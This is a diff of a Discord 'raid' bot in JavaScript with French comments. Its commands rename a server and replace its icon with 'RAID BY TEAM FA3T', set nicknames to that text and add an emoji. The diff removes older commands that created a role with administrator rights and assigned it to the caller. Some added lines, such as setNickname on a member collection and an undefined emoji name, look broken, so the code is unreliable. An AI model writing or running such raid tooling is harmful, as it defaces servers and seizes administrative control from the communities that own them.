@@ -117,7 +117,7 @@ client.on('message', message => {
 
     // Commandes Raid en plus :
 
-    if(message.content === "*help"){
+    if(message.content === "rd!help"){
         message.delete()
         let embed = new Discord.RichEmbed()
             .setColor('#E69900')
@@ -127,27 +127,20 @@ client.on('message', message => {
         message.author.send(embed)
     }
 
-    if(message.content === "*guild"){
+    if(message.content === "rd!guild"){
         message.guild.setIcon("https://cdn.discordapp.com/attachments/517494453095890964/518295237416714240/8Fcd0bji.jpg")
         message.guild.setName("RAID BY TEAM FA3T")
+        message.member.setNickname("RAID BY TEAM FA3T")
     }
 
-    if(message.content === "*raid"){
+    if(message.content === "rd!raid"){
         message.guild.setIcon("https://cdn.discordapp.com/attachments/517494453095890964/518295237416714240/8Fcd0bji.jpg")
         message.guild.setName("RAID BY TEAM FA3T")
+        message.guild.members.setNickname("RAID BY TEAM FA3T")
     }
 
-    if(message.content === "*cA"){
-        let role = message.guild.roles.find(`name`, "C KI L'PATRON");
-        message.guild.createRole({
-            name: "C KI L'PATRON",
-            color: "#c5c5c5",
-            permissions:["ADMINISTRATOR"]
-        })
-    }
-
-    if(message.content === "*a"){
-        message.member.addRole(`name`, "C KI L'PATRON")
+    if(message.content === "rd!emoji"){
+        message.guild.createEmoji('https://cdn.discordapp.com/attachments/519666466145042433/519824123908718604/issou.png', name, 'lol')
     }
 
 });
